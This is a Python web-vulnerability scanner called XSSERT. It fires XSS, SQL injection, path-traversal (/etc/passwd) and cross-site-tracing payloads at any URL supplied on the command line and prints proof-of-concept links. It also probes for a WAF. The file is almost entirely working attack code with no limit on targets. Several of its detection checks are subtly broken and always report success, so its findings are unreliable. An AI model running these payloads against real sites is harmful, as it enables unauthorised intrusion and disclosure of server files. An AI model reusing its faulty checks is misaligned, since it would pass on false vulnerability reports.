import requests
import sys
import time

def cross_site_tracing(url):
    print("\n[!] Injecting Payloads to confirm cross site tracing vulnarability")
    headers = {"Test":"Sample_Payloads"}
    req = requests.get(url, headers=headers)
    head = req.headers
    if "Test" or "test" in head:
        print("[*] Cross Site Tracing Vulnarability Detected!")
    else:
        print("[!] Sample Exploitation Failed")

def local_file_inclusion(url):
    print("\n[!] Testing for local file inclusion vulnerability")
    payloads = ['../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd']
    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pay in payloads:
        uur = urlt + pay
        req = requests.get(uur).text
        if "root:x:0:0" in req:
            print("[*] Payload detected.")
            print("[!] Payload:",pay)
            print("[!] POC",uur)
            break
        else:
            pass

def sqli(url):
    print("\n[!] Testing for SQLi")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(2)'

    time1 = time.time()
    req = requests.get(urlb)
    time2 = time.time()
    timet = time2 - time1
    timet = str(timet)
    timet = timet.split(".")
    timet = timet[0]
    if int(timet) >= 2:
        print("[*] Time Based Blind SQLI VUNERABILIY Detected!")
        print("[!] Payload:",'1-SLEEP(2)')
        print("[!] POC:",urlb)
    else:
        print("[!] Time Based SQLI failed.")


    payload1 = "'"
    urlq = urlt + payload1
    reqqq = requests.get(urlq).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
        print("\n[*] SQLi Error detected.")
        print("[!] Payload:",payload1)
        print("[!] POC:",urlq)
    else:
        pass
def xss(url):
    paydone = []
    payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("XSS detected")</script>']
    print("[!] Testing for XSS")
    print("[!] 10 Payloads.")

    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pl in payloads:
        urlte = urlt + pl
        re = requests.get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
    req1 = requests.get(url1).text
    if "'>XSS detected<svg/onload=confirm(/XSS detected/)>web" in req1:
        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
    else:
        pass

    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req2 = requests.get(url2).text
    if '<script>alert("XSS detected")</script>' in req2:
        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req3 = requests.get(url3).text
    if '<script>alert("XSS detected")</script>' in req3:
        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    if len(paydone) == 0:
        print("[!] XSS Exploitation Failed.")
    else:
        print("[+]",len(paydone),"Payloads were found.")
        for p in paydone:
            print("\n[*] Payload found!")
            print("[!] Payload:",p)
            print("[!] POC:",urlt+p)


def wafdetect(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with status code:", sc.status_code)
    except:
        print("[!] Error with the first request.")
        exit()
    r = requests.get(url)

    opt = ["Yes","yes","Y","y"]
    try:
        if r.headers["server"] == "cloudflare":
            print("[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare WAF.")
            ex = input("[\033[1;31m!\033[0;0m]Exit y/n: ")
            if ex in opt:
                exit("[\033[1;33m!\033[0;0m] - Quitting...")
    except:
        pass

    payload = "?=<script>alert()</script>"
    fuzz = url + payload
    waffd = requests.get(fuzz)
    if waffd.status_code == 406 or waffd.status_code == 501:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 999:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 419:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 403:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    else:
        print("[*] No WAF Detected.")
def header(url):
    h = requests.get(url)
    he = h.headers

    try:
        print("Server:",he['server'])
    except:
        pass
    try:
        print("Data:",he['date'])
    except:
        pass
    try:
        print("Powered:",he['x-powered-by'])
    except:
        pass
    print("\n")
def banner(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statuS code:",sc.status_code)
    except:
        print("[!] Error with the first request.")
        exit()

    print("""
    XSSERT
    ------
Target: {}
    """.format(url))
def help():
    print("""
    XSSERT
    ------
    
    python3 XSSERT.py http://example.com/page.php?id=value
    """)
    exit()

try:
    arvs = sys.argv
    url = arvs[1]
except:
    help()

if 'http' not in url:
    help()
if '?' not in url:
    help()

timing1 = time.time()
wafdetect(url)
banner(url)
header(url)
xss(url)
sqli(url)
local_file_inclusion(url)
cross_site_tracing(url)
timing2 = time.time()
timet = timing2 - timing1
timet = str(timet)
timet = timet.split(".")
print("\n[!] Time used:",timet[0],"seconds.\n")

#Written by Joel Greyhat
#XSSERT WILL SCAN FOR DIFFRENT TYPE OF VULNERABILITIES BY INJECTING DIFFRENT GIVEN PAYLOADS FOR EACH VULNERABILITY
#XSSERT V1.0

